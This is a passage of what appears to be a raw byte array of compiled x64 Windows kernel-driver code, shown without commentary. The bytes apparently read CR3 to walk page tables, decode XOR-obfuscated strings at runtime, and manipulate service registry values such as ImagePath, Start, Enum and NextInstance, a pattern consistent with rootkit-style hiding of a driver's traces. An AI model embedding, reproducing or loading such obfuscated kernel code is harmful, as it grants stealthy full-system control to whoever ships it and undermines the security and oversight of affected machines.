0x89, 0x64, 0x24, 0x30, 0x41, 0x8B, 0xDC, 0xC7, 0x44, 0x24, 0x28, 0x10, 0x00, 0x00, 0x00, 0x44,
0x89, 0x64, 0x24, 0x20, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0x49, 0x8B, 0xCE, 0xFF,
0x15, 0x13, 0x1E, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0xEB, 0x16, 0x8B, 0xD8, 0x45, 0x33,
0xE4, 0x4C, 0x8D, 0x2D, 0xA8, 0x33, 0x00, 0x00, 0x4C, 0x8B, 0x74, 0x24, 0x38, 0x48, 0x8B, 0x44,
0x24, 0x30, 0x85, 0xDB, 0x78, 0x54, 0x48, 0x85, 0xC0, 0x74, 0x4F, 0x4C, 0x89, 0x35, 0x46, 0x32,
0x00, 0x00, 0x48, 0x89, 0x05, 0x47, 0x32, 0x00, 0x00, 0x48, 0x89, 0x05, 0x18, 0x32, 0x00, 0x00,
0x48, 0x8B, 0x0D, 0x11, 0x32, 0x00, 0x00, 0xC7, 0x41, 0x0C, 0x60, 0x4D, 0x34, 0x01, 0xC6, 0x05,
0x5B, 0x2D, 0x00, 0x00, 0x00, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x87, 0x41, 0x04, 0x48, 0xC7, 0x44,
0x24, 0x40, 0x80, 0x3C, 0x36, 0xFE, 0x4C, 0x8D, 0x44, 0x24, 0x40, 0x33, 0xD2, 0x33, 0xC9, 0xFF,
0x15, 0xEB, 0x1D, 0x00, 0x00, 0xE9, 0x96, 0xFD, 0xFF, 0xFF, 0x49, 0x8B, 0xCE, 0xFF, 0x15, 0x65,
0x1D, 0x00, 0x00, 0xEB, 0xBB, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0x40, 0x55, 0x53, 0x56, 0x57, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8D, 0xAC, 0x24, 0x78, 0xFD, 0xFF,
0xFF, 0x48, 0x81, 0xEC, 0x88, 0x03, 0x00, 0x00, 0x4C, 0x8B, 0xF2, 0x48, 0x8B, 0xF1, 0xE8, 0x0D,
0xD1, 0xFF, 0xFF, 0x33, 0xC0, 0x45, 0x33, 0xFF, 0x48, 0x39, 0x05, 0x81, 0x32, 0x00, 0x00, 0x0F,
0x57, 0xC0, 0x0F, 0x11, 0x05, 0xD7, 0x32, 0x00, 0x00, 0x48, 0x89, 0x05, 0xE0, 0x32, 0x00, 0x00,
0x75, 0x70, 0x0F, 0x20, 0xDB, 0x48, 0x81, 0xE3, 0x00, 0xF0, 0xFF, 0xFF, 0x48, 0x8B, 0xCB, 0xFF,
0x15, 0xFB, 0x1C, 0x00, 0x00, 0x4C, 0x8B, 0xC0, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0xBE, 0x00, 0x00,
0x00, 0x41, 0x8B, 0xD7, 0x49, 0xB9, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x66, 0x90,
0x49, 0x8B, 0x0C, 0xD0, 0xF6, 0xC1, 0x01, 0x74, 0x13, 0x48, 0xC1, 0xE9, 0x0C, 0x48, 0x8B, 0xC3,
0x48, 0xC1, 0xF8, 0x0C, 0x49, 0x23, 0xC9, 0x48, 0x3B, 0xC8, 0x74, 0x0E, 0x48, 0xFF, 0xC2, 0x48,
0x81, 0xFA, 0x00, 0x02, 0x00, 0x00, 0x72, 0xD8, 0xEB, 0x0F, 0x48, 0xC1, 0xE2, 0x37, 0x48, 0xC1,
0xFA, 0x10, 0x48, 0x89, 0x15, 0x07, 0x32, 0x00, 0x00, 0x4C, 0x39, 0x3D, 0x00, 0x32, 0x00, 0x00,
0x74, 0x6D, 0xBA, 0x67, 0x54, 0x79, 0x4D, 0xB9, 0x00, 0x10, 0x00, 0x00, 0xFF, 0x15, 0x7E, 0x1C,
0x00, 0x00, 0x48, 0x8B, 0xD8, 0x48, 0x85, 0xC0, 0x74, 0x55, 0x48, 0x8B, 0x0D, 0xDF, 0x31, 0x00,
0x00, 0x4C, 0x8B, 0xC0, 0x49, 0xC1, 0xE8, 0x0C, 0x48, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF, 0x0F, 0x00,
0x00, 0x00, 0x4C, 0x23, 0xC0, 0x4A, 0x8D, 0x3C, 0xC1, 0x48, 0x8B, 0xCF, 0xFF, 0x15, 0xD6, 0x1C,
0x00, 0x00, 0x84, 0xC0, 0x75, 0x10, 0xBA, 0x67, 0x54, 0x79, 0x4D, 0x48, 0x8B, 0xCB, 0xFF, 0x15,
0x6C, 0x1C, 0x00, 0x00, 0xEB, 0x19, 0x48, 0x89, 0x1D, 0x03, 0x32, 0x00, 0x00, 0x48, 0xC7, 0x05,
0x00, 0x32, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x48, 0x89, 0x3D, 0x01, 0x32, 0x00, 0x00, 0x4C,
0x39, 0x3D, 0xA2, 0x31, 0x00, 0x00, 0x74, 0x09, 0x4C, 0x39, 0x3D, 0xC1, 0x31, 0x00, 0x00, 0x75,
0x05, 0xE8, 0x4A, 0xEE, 0xFF, 0xFF, 0x4C, 0x39, 0x3D, 0x13, 0x31, 0x00, 0x00, 0x74, 0x09, 0x4C,
0x39, 0x3D, 0x72, 0x31, 0x00, 0x00, 0x75, 0x05, 0xE8, 0x53, 0xF1, 0xFF, 0xFF, 0xE8, 0x9E, 0xCC,
0xFF, 0xFF, 0x84, 0xC0, 0x0F, 0x84, 0xB3, 0x07, 0x00, 0x00, 0xE8, 0x11, 0xCD, 0xFF, 0xFF, 0x84,
0xC0, 0x0F, 0x84, 0xA6, 0x07, 0x00, 0x00, 0xE8, 0x54, 0xCD, 0xFF, 0xFF, 0x84, 0xC0, 0x0F, 0x84,
0x99, 0x07, 0x00, 0x00, 0xE8, 0xF7, 0xCD, 0xFF, 0xFF, 0x84, 0xC0, 0x0F, 0x84, 0x8C, 0x07, 0x00,
0x00, 0x48, 0x8D, 0x05, 0xD8, 0xFB, 0xFF, 0xFF, 0x4C, 0x89, 0x7C, 0x24, 0x30, 0x48, 0x89, 0x44,
0x24, 0x28, 0x48, 0x8D, 0x0D, 0x47, 0x30, 0x00, 0x00, 0x4C, 0x89, 0xA4, 0x24, 0xC0, 0x03, 0x00,
0x00, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0x4C, 0x89, 0x7C, 0x24, 0x20, 0xBA, 0xFF, 0xFF, 0x1F,
0x00, 0x4C, 0x89, 0xAC, 0x24, 0x80, 0x03, 0x00, 0x00, 0xFF, 0x15, 0x69, 0x1B, 0x00, 0x00, 0x48,
0x8D, 0x05, 0xDA, 0xF3, 0xFF, 0xFF, 0x4C, 0x89, 0x7C, 0x24, 0x30, 0x48, 0x89, 0x44, 0x24, 0x28,
0x48, 0x8D, 0x0D, 0xF9, 0x2F, 0x00, 0x00, 0x45, 0x33, 0xC9, 0x4C, 0x89, 0x7C, 0x24, 0x20, 0x45,
0x33, 0xC0, 0xBA, 0xFF, 0xFF, 0x1F, 0x00, 0xFF, 0x15, 0x3B, 0x1B, 0x00, 0x00, 0x45, 0x33, 0xC0,
0x48, 0x8D, 0x15, 0x39, 0xE1, 0xFF, 0xFF, 0x48, 0x8B, 0xCE, 0xFF, 0x15, 0xE0, 0x30, 0x00, 0x00,
0x48, 0x8B, 0x05, 0x59, 0x30, 0x00, 0x00, 0x4C, 0x8D, 0x44, 0x24, 0x58, 0x49, 0x8B, 0x56, 0x08,
0x33, 0xC9, 0xC7, 0x44, 0x24, 0x40, 0xA9, 0x00, 0x87, 0x00, 0xC7, 0x44, 0x24, 0x44, 0x9C, 0x00,
0x80, 0x00, 0xC7, 0x44, 0x24, 0x48, 0x9D, 0x00, 0x93, 0x00, 0xC7, 0x44, 0x24, 0x4C, 0x8A, 0x00,
0xBA, 0x00, 0xC7, 0x44, 0x24, 0x50, 0x94, 0x00, 0x9B, 0x00, 0xC7, 0x44, 0x24, 0x54, 0x92, 0x00,
0xF8, 0x00, 0xC7, 0x44, 0x24, 0x58, 0x44, 0x00, 0x69, 0x00, 0xC7, 0x44, 0x24, 0x5C, 0x73, 0x00,
0x70, 0x00, 0xC7, 0x44, 0x24, 0x60, 0x6C, 0x00, 0x61, 0x00, 0xC7, 0x44, 0x24, 0x64, 0x79, 0x00,
0x4E, 0x00, 0xC7, 0x44, 0x24, 0x68, 0x61, 0x00, 0x6D, 0x00, 0xC7, 0x44, 0x24, 0x6C, 0x65, 0x00,
0x00, 0x00, 0xFF, 0xD0, 0x48, 0x8B, 0x05, 0xE5, 0x2F, 0x00, 0x00, 0x4C, 0x8D, 0x45, 0x22, 0x49,
0x8B, 0x56, 0x08, 0x33, 0xC9, 0xC7, 0x45, 0x08, 0xA8, 0x00, 0x9C, 0x00, 0xC7, 0x45, 0x0C, 0x9D,
0x00, 0x9F, 0x00, 0xC7, 0x45, 0x10, 0x83, 0x00, 0xB1, 0x00, 0xC7, 0x45, 0x14, 0x9C, 0x00, 0x9A,
0x00, 0xC7, 0x45, 0x18, 0x81, 0x00, 0x84, 0x00, 0xC7, 0x45, 0x1C, 0x98, 0x00, 0x94, 0x00, 0xC7,
0x45, 0x20, 0xF9, 0x00, 0x45, 0x00, 0xC7, 0x45, 0x24, 0x72, 0x00, 0x72, 0x00, 0xC7, 0x45, 0x28,
0x6F, 0x00, 0x72, 0x00, 0xC7, 0x45, 0x2C, 0x43, 0x00, 0x6F, 0x00, 0xC7, 0x45, 0x30, 0x6E, 0x00,
0x74, 0x00, 0xC7, 0x45, 0x34, 0x72, 0x00, 0x6F, 0x00, 0xC7, 0x45, 0x38, 0x6C, 0x00, 0x00, 0x00,
0xFF, 0xD0, 0x48, 0x8B, 0x05, 0x77, 0x2F, 0x00, 0x00, 0x4C, 0x8D, 0x44, 0x24, 0x54, 0x49, 0x8B,
0x56, 0x08, 0x33, 0xC9, 0xC7, 0x44, 0x24, 0x40, 0xA4, 0x00, 0x83, 0x00, 0xC7, 0x44, 0x24, 0x44,
0x8E, 0x00, 0x97, 0x00, 0xC7, 0x44, 0x24, 0x48, 0x94, 0x00, 0xA2, 0x00, 0xC7, 0x44, 0x24, 0x4C,
0x92, 0x00, 0x80, 0x00, 0xC7, 0x44, 0x24, 0x50, 0x9D, 0x00, 0xF6, 0x00, 0xC7, 0x44, 0x24, 0x54,
0x49, 0x00, 0x6D, 0x00, 0xC7, 0x44, 0x24, 0x58, 0x61, 0x00, 0x67, 0x00, 0xC7, 0x44, 0x24, 0x5C,
0x65, 0x00, 0x50, 0x00, 0xC7, 0x44, 0x24, 0x60, 0x61, 0x00, 0x74, 0x00, 0xC7, 0x44, 0x24, 0x64,
0x68, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x48, 0x8B, 0x05, 0x13, 0x2F, 0x00, 0x00, 0xC7, 0x45, 0x80,
0xBE, 0x00, 0x9A, 0x00, 0xC7, 0x45, 0x84, 0x8E, 0x00, 0x82, 0x00, 0xC7, 0x45, 0x88, 0x85, 0x00,
0xF2, 0x00, 0xC7, 0x45, 0x8C, 0x53, 0x00, 0x74, 0x00, 0xC7, 0x45, 0x90, 0x61, 0x00, 0x72, 0x00,
0xC7, 0x45, 0x94, 0x74, 0x00, 0x00, 0x00, 0x49, 0x8B, 0x56, 0x08, 0x4C, 0x8D, 0x45, 0x8C, 0x33,
0xC9, 0xFF, 0xD0, 0x48, 0x8B, 0x05, 0xD6, 0x2E, 0x00, 0x00, 0x4C, 0x8D, 0x45, 0xB2, 0x49, 0x8B,
0x56, 0x08, 0x33, 0xC9, 0xC7, 0x45, 0xA8, 0xB9, 0x00, 0x97, 0x00, 0xC7, 0x45, 0xAC, 0x9F, 0x00,
0x95, 0x00, 0xC7, 0x45, 0xB0, 0xF1, 0x00, 0x54, 0x00, 0xC7, 0x45, 0xB4, 0x79, 0x00, 0x70, 0x00,
0xC7, 0x45, 0xB8, 0x65, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x48, 0x8B, 0x05, 0xA0, 0x2E, 0x00, 0x00,
0x4C, 0x8D, 0x45, 0x8C, 0x49, 0x8B, 0x56, 0x08, 0x33, 0xC9, 0xC7, 0x45, 0x80, 0xBA, 0x00, 0xA1,
0x00, 0xC7, 0x45, 0x84, 0xB8, 0x00, 0xC6, 0x00, 0xC7, 0x45, 0x88, 0xC5, 0x00, 0xF2, 0x00, 0xC7,
0x45, 0x8C, 0x57, 0x00, 0x4F, 0x00, 0xC7, 0x45, 0x90, 0x57, 0x00, 0x36, 0x00, 0xC7, 0x45, 0x94,
0x34, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0xB8, 0x08, 0x02, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xF8, 0x0F,
0x57, 0xC0, 0x49, 0x8B, 0xD6, 0x0F, 0x11, 0x45, 0xF8, 0x66, 0x89, 0x45, 0xFA, 0x48, 0x8D, 0x45,
0x70, 0x48, 0x89, 0x45, 0x00, 0xE8, 0xC6, 0xC8, 0xFF, 0xFF, 0x85, 0xC0, 0x0F, 0x88, 0xD4, 0x02,
0x00, 0x00, 0x48, 0x8B, 0x05, 0xBF, 0x2E, 0x00, 0x00, 0x48, 0x8D, 0x55, 0x8C, 0x48, 0x8D, 0x4D,
0xA8, 0xC7, 0x45, 0x80, 0xB1, 0x00, 0xAB, 0x00, 0xC7, 0x45, 0x84, 0x81, 0x00, 0x85, 0x00, 0xC7,
0x45, 0x88, 0x9C, 0x00, 0xF2, 0x00, 0xC7, 0x45, 0x8C, 0x5C, 0x00, 0x45, 0x00, 0xC7, 0x45, 0x90,
0x6E, 0x00, 0x75, 0x00, 0xC7, 0x45, 0x94, 0x6D, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0xF6, 0x45, 0xF8,
0x01, 0x0F, 0x85, 0x8F, 0x02, 0x00, 0x00, 0xF6, 0x45, 0xFA, 0x01, 0x0F, 0x85, 0x85, 0x02, 0x00,
0x00, 0x0F, 0xB7, 0x55, 0xF8, 0x0F, 0xB7, 0x45, 0xFA, 0x66, 0x3B, 0xD0, 0x0F, 0x87, 0x74, 0x02,
0x00, 0x00, 0x41, 0xB8, 0xFE, 0xFF, 0x00, 0x00, 0x66, 0x41, 0x3B, 0xC0, 0x0F, 0x87, 0x64, 0x02,
0x00, 0x00, 0x48, 0x8B, 0x7D, 0x00, 0x48, 0x85, 0xFF, 0x75, 0x12, 0x66, 0x85, 0xD2, 0x0F, 0x85,
0x52, 0x02, 0x00, 0x00, 0x66, 0x85, 0xC0, 0x0F, 0x85, 0x49, 0x02, 0x00, 0x00, 0x4C, 0x8B, 0xD2,
0x48, 0x8B, 0xC8, 0x0F, 0xB7, 0x55, 0xA8, 0x48, 0xD1, 0xE9, 0x49, 0xD1, 0xEA, 0xF6, 0xC2, 0x01,
0x0F, 0x85, 0x30, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x45, 0xAA, 0xA8, 0x01, 0x0F, 0x85, 0x24, 0x02,
0x00, 0x00, 0x66, 0x3B, 0xD0, 0x0F, 0x87, 0x1B, 0x02, 0x00, 0x00, 0x66, 0x41, 0x3B, 0xC0, 0x0F,
0x87, 0x11, 0x02, 0x00, 0x00, 0x4C, 0x8B, 0x45, 0xB0, 0x4D, 0x85, 0xC0, 0x75, 0x12, 0x66, 0x85,
0xD2, 0x0F, 0x85, 0xFF, 0x01, 0x00, 0x00, 0x66, 0x85, 0xC0, 0x0F, 0x85, 0xF6, 0x01, 0x00, 0x00,
0x48, 0xD1, 0xEA, 0x4E, 0x8D, 0x0C, 0x57, 0x41, 0x8B, 0xDF, 0x4D, 0x8B, 0xDF, 0x49, 0x2B, 0xCA,
0x74, 0x29, 0x48, 0x85, 0xD2, 0x0F, 0x84, 0x07, 0x04, 0x00, 0x00, 0x41, 0x0F, 0xB7, 0x00, 0x48,
0xFF, 0xCA, 0x66, 0x41, 0x89, 0x01, 0x49, 0x83, 0xC0, 0x02, 0x49, 0x83, 0xC1, 0x02, 0x49, 0xFF,
0xC3, 0x48, 0x83, 0xE9, 0x01, 0x75, 0xDB, 0x48, 0x8B, 0x7D, 0x00, 0x48, 0x85, 0xD2, 0xB8, 0x05,
0x00, 0x00, 0x80, 0x0F, 0x45, 0xD8, 0x66, 0x45, 0x03, 0xD3, 0x66, 0x45, 0x03, 0xD2, 0x66, 0x44,
0x89, 0x55, 0xF8, 0x85, 0xDB, 0x0F, 0x88, 0x9B, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xFE, 0x2C,
0x00, 0x00, 0x4C, 0x8D, 0x44, 0x24, 0x4C, 0x48, 0x8B, 0xD7, 0xC7, 0x44, 0x24, 0x40, 0xAE, 0x00,
0x81, 0x00, 0x33, 0xC9, 0xC7, 0x44, 0x24, 0x44, 0x9A, 0x00, 0x9E, 0x00, 0xC7, 0x44, 0x24, 0x48,
0x85, 0x00, 0xF2, 0x00, 0xC7, 0x44, 0x24, 0x4C, 0x43, 0x00, 0x6F, 0x00, 0xC7, 0x44, 0x24, 0x50,
0x75, 0x00, 0x6E, 0x00, 0xC7, 0x44, 0x24, 0x54, 0x74, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x48, 0x8B,
0x05, 0xBB, 0x2C, 0x00, 0x00, 0x4C, 0x8D, 0x45, 0xDA, 0x48, 0x8B, 0x55, 0x00, 0x33, 0xC9, 0xC7,
0x45, 0xC0, 0xA3, 0x00, 0x8B, 0x00, 0xC7, 0x45, 0xC4, 0x97, 0x00, 0x84, 0x00, 0xC7, 0x45, 0xC8,
0xB8, 0x00, 0x9C, 0x00, 0xC7, 0x45, 0xCC, 0x80, 0x00, 0x80, 0x00, 0xC7, 0x45, 0xD0, 0x94, 0x00,
0x98, 0x00, 0xC7, 0x45, 0xD4, 0x94, 0x00, 0x9D, 0x00, 0xC7, 0x45, 0xD8, 0xF9, 0x00, 0x4E, 0x00,
0xC7, 0x45, 0xDC, 0x65, 0x00, 0x78, 0x00, 0xC7, 0x45, 0xE0, 0x74, 0x00, 0x49, 0x00, 0xC7, 0x45,
0xE4, 0x6E, 0x00, 0x73, 0x00, 0xC7, 0x45, 0xE8, 0x74, 0x00, 0x61, 0x00, 0xC7, 0x45, 0xEC, 0x6E,
0x00, 0x63, 0x00, 0xC7, 0x45, 0xF0, 0x65, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x48, 0x8B, 0x05, 0x4D,
0x2C, 0x00, 0x00, 0x4C, 0x8D, 0x44, 0x24, 0x60, 0x48, 0x8B, 0x55, 0x00, 0x33, 0xC9, 0xC7, 0x44,
0x24, 0x40, 0xA4, 0x00, 0xA0, 0x00, 0xC7, 0x44, 0x24, 0x44, 0xA6, 0x00, 0xA4, 0x00, 0xC7, 0x44,
0x24, 0x48, 0xA2, 0x00, 0xA6, 0x00, 0xC7, 0x44, 0x24, 0x4C, 0xB2, 0x00, 0xA6, 0x00, 0xC7, 0x44,
0x24, 0x50, 0xA1, 0x00, 0xB0, 0x00, 0xC7, 0x44, 0x24, 0x54, 0xB6, 0x00, 0xB1, 0x00, 0xC7, 0x44,
0x24, 0x58, 0xB5, 0x00, 0xBF, 0x00, 0xC7, 0x44, 0x24, 0x5C, 0xBF, 0x00, 0xFC, 0x00, 0xC7, 0x44,
0x24, 0x60, 0x49, 0x00, 0x4E, 0x00, 0xC7, 0x44, 0x24, 0x64, 0x49, 0x00, 0x54, 0x00, 0xC7, 0x44,
0x24, 0x68, 0x53, 0x00, 0x54, 0x00, 0xC7, 0x44, 0x24, 0x6C, 0x41, 0x00, 0x52, 0x00, 0xC7, 0x44,
0x24, 0x70, 0x54, 0x00, 0x46, 0x00, 0xC7, 0x44, 0x24, 0x74, 0x41, 0x00, 0x49, 0x00, 0xC7, 0x44,
0x24, 0x78, 0x4C, 0x00, 0x45, 0x00, 0xC7, 0x44, 0x24, 0x7C, 0x44, 0x00, 0x00, 0x00, 0xFF, 0xD0,
0x48, 0x8D, 0x45, 0xF8, 0xC7, 0x45, 0x08, 0x30, 0x00, 0x00, 0x00, 0x0F, 0x57, 0xC0, 0x48, 0x89,
0x45, 0x18, 0x4C, 0x8D, 0x45, 0x08, 0x4C, 0x89, 0x7D, 0x10, 0xBA, 0x00, 0x00, 0x01, 0x00, 0xC7,
0x45, 0x20, 0x40, 0x02, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0xD0, 0x02, 0x00, 0x00, 0xF3, 0x0F, 0x7F,
0x45, 0x28, 0xFF, 0x15, 0xD0, 0x16, 0x00, 0x00, 0x85, 0xC0, 0x78, 0x1A, 0x48, 0x8B, 0x8D, 0xD0,
0x02, 0x00, 0x00, 0xFF, 0x15, 0x5F, 0x16, 0x00, 0x00, 0x48, 0x8B, 0x8D, 0xD0, 0x02, 0x00, 0x00,
0xFF, 0x15, 0xAA, 0x16, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x63, 0x2B, 0x00, 0x00, 0x4C, 0x8D, 0x44,
0x24, 0x58, 0x49, 0x8B, 0x56, 0x08, 0x33, 0xC9, 0xC7, 0x44, 0x24, 0x40, 0xA9, 0x00, 0x87, 0x00,
0xC7, 0x44, 0x24, 0x44, 0x9C, 0x00, 0x80, 0x00, 0xC7, 0x44, 0x24, 0x48, 0x9D, 0x00, 0x93, 0x00,
0xC7, 0x44, 0x24, 0x4C, 0x8A, 0x00, 0xBA, 0x00, 0xC7, 0x44, 0x24, 0x50, 0x94, 0x00, 0x9B, 0x00,
0xC7, 0x44, 0x24, 0x54, 0x92, 0x00, 0xF8, 0x00, 0xC7, 0x44, 0x24, 0x58, 0x44, 0x00, 0x69, 0x00,
0xC7, 0x44, 0x24, 0x5C, 0x73, 0x00, 0x70, 0x00, 0xC7, 0x44, 0x24, 0x60, 0x6C, 0x00, 0x61, 0x00,
0xC7, 0x44, 0x24, 0x64, 0x79, 0x00, 0x4E, 0x00, 0xC7, 0x44, 0x24, 0x68, 0x61, 0x00, 0x6D, 0x00,
0xC7, 0x44, 0x24, 0x6C, 0x65, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x48, 0x8B, 0x05, 0xEF, 0x2A, 0x00,
0x00, 0x4C, 0x8D, 0x45, 0xDA, 0x49, 0x8B, 0x56, 0x08, 0x33, 0xC9, 0xC7, 0x45, 0xC0, 0xA8, 0x00,
0x9C, 0x00, 0xC7, 0x45, 0xC4, 0x9D, 0x00, 0x9F, 0x00, 0xC7, 0x45, 0xC8, 0x83, 0x00, 0xB1, 0x00,
0xC7, 0x45, 0xCC, 0x9C, 0x00, 0x9A, 0x00, 0xC7, 0x45, 0xD0, 0x81, 0x00, 0x84, 0x00, 0xC7, 0x45,
0xD4, 0x98, 0x00, 0x94, 0x00, 0xC7, 0x45, 0xD8, 0xF9, 0x00, 0x45, 0x00, 0xC7, 0x45, 0xDC, 0x72,
0x00, 0x72, 0x00, 0xC7, 0x45, 0xE0, 0x6F, 0x00, 0x72, 0x00, 0xC7, 0x45, 0xE4, 0x43, 0x00, 0x6F,
0x00, 0xC7, 0x45, 0xE8, 0x6E, 0x00, 0x74, 0x00, 0xC7, 0x45, 0xEC, 0x72, 0x00, 0x6F, 0x00, 0xC7,
0x45, 0xF0, 0x6C, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x48, 0x8B, 0x05, 0x81, 0x2A, 0x00, 0x00, 0x4C,
0x8D, 0x45, 0x94, 0x49, 0x8B, 0x56, 0x08, 0x33, 0xC9, 0xC7, 0x45, 0x80, 0xA4, 0x00, 0x83, 0x00,
0xC7, 0x45, 0x84, 0x8E, 0x00, 0x97, 0x00, 0xC7, 0x45, 0x88, 0x94, 0x00, 0xA2, 0x00, 0xC7, 0x45,
0x8C, 0x92, 0x00, 0x80, 0x00, 0xC7, 0x45, 0x90, 0x9D, 0x00, 0xF6, 0x00, 0xC7, 0x45, 0x94, 0x49,
0x00, 0x6D, 0x00, 0xC7, 0x45, 0x98, 0x61, 0x00, 0x67, 0x00, 0xC7, 0x45, 0x9C, 0x65, 0x00, 0x50,
0x00, 0xC7, 0x45, 0xA0, 0x61, 0x00, 0x74, 0x00, 0xC7, 0x45, 0xA4, 0x68, 0x00, 0x00, 0x00, 0xFF,
0xD0, 0x48, 0x8B, 0x05, 0x28, 0x2A, 0x00, 0x00, 0x4C, 0x8D, 0x44, 0x24, 0x4C, 0x49, 0x8B, 0x56,
0x08, 0x33, 0xC9, 0xC7, 0x44, 0x24, 0x40, 0xBE, 0x00, 0x9A, 0x00, 0xC7, 0x44, 0x24, 0x44, 0x8E,
0x00, 0x82, 0x00, 0xC7, 0x44, 0x24, 0x48, 0x85, 0x00, 0xF2, 0x00, 0xC7, 0x44, 0x24, 0x4C, 0x53,
0x00, 0x74, 0x00, 0xC7, 0x44, 0x24, 0x50, 0x61, 0x00, 0x72, 0x00, 0xC7, 0x44, 0x24, 0x54, 0x74,
0x00, 0x00, 0x00, 0xFF, 0xD0, 0x48, 0x8B, 0x05, 0xE4, 0x29, 0x00, 0x00, 0x4C, 0x8D, 0x45, 0xB2,
0x49, 0x8B, 0x56, 0x08, 0x33, 0xC9, 0xC7, 0x45, 0xA8, 0xB9, 0x00, 0x97, 0x00, 0xC7, 0x45, 0xAC,
0x9F, 0x00, 0x95, 0x00, 0xC7, 0x45, 0xB0, 0xF1, 0x00, 0x54, 0x00, 0xC7, 0x45, 0xB4, 0x79, 0x00,
0x70, 0x00, 0xC7, 0x45, 0xB8, 0x65, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x0F, 0x57, 0xC0, 0xC7, 0x45,
0x40, 0x30, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x45, 0x40, 0x4C, 0x89, 0x7D, 0x48, 0xBA, 0x00, 0x00,
0x01, 0x00, 0xC7, 0x45, 0x58, 0x40, 0x02, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0xD8, 0x02, 0x00, 0x00,
0x4C, 0x89, 0x75, 0x50, 0xF3, 0x0F, 0x7F, 0x45, 0x60, 0xFF, 0x15, 0xC9, 0x14, 0x00, 0x00, 0x4C,
0x8B, 0xAC, 0x24, 0x80, 0x03, 0x00, 0x00, 0x4C, 0x8B, 0xA4, 0x24, 0xC0, 0x03, 0x00, 0x00, 0x85,
0xC0, 0x78, 0x1A, 0x48, 0x8B, 0x8D, 0xD8, 0x02, 0x00, 0x00, 0xFF, 0x15, 0x48, 0x14, 0x00, 0x00,
0x48, 0x8B, 0x8D, 0xD8, 0x02, 0x00, 0x00, 0xFF, 0x15, 0x93, 0x14, 0x00, 0x00, 0xB8, 0x01, 0x00,
0x00, 0xC0, 0x48, 0x81, 0xC4, 0x88, 0x03, 0x00, 0x00, 0x41, 0x5F, 0x41, 0x5E, 0x5F, 0x5E, 0x5B,
0x5D, 0xC3, 0x48, 0x8B, 0x7D, 0x00, 0xE9, 0x1B, 0xFC, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0xB8, 0xED, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xC1, 0x66, 0x33, 0x01, 0x66, 0x89, 0x41, 0x42, 0xB8,
0xEE, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x02, 0x66, 0x89, 0x41, 0x44, 0xB8, 0xEF, 0x00, 0x00,
0x00, 0x66, 0x33, 0x41, 0x04, 0x66, 0x89, 0x41, 0x46, 0xB8, 0xF0, 0x00, 0x00, 0x00, 0x66, 0x33,
0x41, 0x06, 0x66, 0x89, 0x41, 0x48, 0xB8, 0xF1, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x08, 0x66,
0x89, 0x41, 0x4A, 0xB8, 0xF2, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x0A, 0x66, 0x89, 0x41, 0x4C,
0xB8, 0xF3, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x0C, 0x66, 0x89, 0x41, 0x4E, 0xB8, 0xF4, 0x00,
0x00, 0x00, 0x66, 0x33, 0x41, 0x0E, 0x66, 0x89, 0x41, 0x50, 0xB8, 0xF5, 0x00, 0x00, 0x00, 0x66,
0x33, 0x41, 0x10, 0x66, 0x89, 0x41, 0x52, 0xB8, 0xF6, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x12,
0x66, 0x89, 0x41, 0x54, 0xB8, 0xF7, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x14, 0x66, 0x89, 0x41,
0x56, 0xB8, 0xF8, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x16, 0x66, 0x89, 0x41, 0x58, 0xB8, 0xF9,
0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x18, 0x66, 0x89, 0x41, 0x5A, 0xB8, 0xFA, 0x00, 0x00, 0x00,
0x66, 0x33, 0x41, 0x1A, 0x66, 0x89, 0x41, 0x5C, 0xB8, 0xFB, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41,
0x1C, 0x66, 0x89, 0x41, 0x5E, 0xB8, 0xFC, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x1E, 0x66, 0x89,
0x41, 0x60, 0xB8, 0xFD, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x20, 0x66, 0x89, 0x41, 0x62, 0xB8,
0xFE, 0x00, 0x00, 0x00, 0x66, 0x33, 0x41, 0x22, 0x66, 0x89, 0x41, 0x64, 0xB8, 0xFF, 0x00, 0x00,
0x00, 0x66, 0x33, 0x41, 0x24, 0x66, 0x89, 0x41, 0x66, 0xB8, 0x00, 0x01, 0x00, 0x00, 0x66, 0x33,
